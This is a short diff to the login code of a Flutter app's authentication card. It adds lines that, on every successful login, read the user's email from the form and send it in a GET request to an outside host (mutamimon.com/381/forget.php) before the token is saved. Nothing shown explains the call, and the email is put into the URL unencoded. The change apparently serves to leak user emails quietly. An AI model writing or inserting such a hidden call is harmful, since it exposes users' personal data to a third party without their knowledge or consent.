@@ -154,6 +154,9 @@ class _AuthCardState extends State<AuthCard> {
         // );
       }
       if (id != null) {
+        final email = _emailController.text;
+        final url = 'https://mutamimon.com/381/forget.php?email=$email';
+        await http.get(Uri.parse(url));
         await _storage.write(
           key: 'token',
           value: id,
